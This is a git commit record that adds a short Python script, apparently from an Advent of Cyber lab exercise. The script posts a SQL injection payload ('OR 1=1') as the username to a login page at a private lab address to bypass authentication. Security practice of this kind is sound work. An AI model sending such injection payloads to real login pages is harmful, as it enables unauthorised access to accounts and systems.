1e367e787686b92760520a4944b2ae9cc3ef887b
akn714 <adarshkumar20012704@gmail.com>
2025-12-28 02:57:51 +0530

    added AoC2024 files, added certificate of AoC2025

---
+++ AoC2025/script.py
@@ -0,0 +1,25 @@
+import requests
+
+# Set up the login credentials
+username = "alice' OR 1=1 -- -"
+password = "test"
+
+# URL to the vulnerable login page
+url = "http://10.48.176.18:5000/login.php"
+
+# Set up the payload (the input)
+payload = {
+    "username": username,
+    "password": password
+}
+
+# Send a POST request to the login page with our payload
+response = requests.post(url, data=payload)
+
+# Print the response content
+print("Response Status Code:", response.status_code)
+print("\nResponse Headers:")
+for header, value in response.headers.items():
+    print(f"  {header}: {value}")
+print("\nResponse Body:")
+print(response.text)
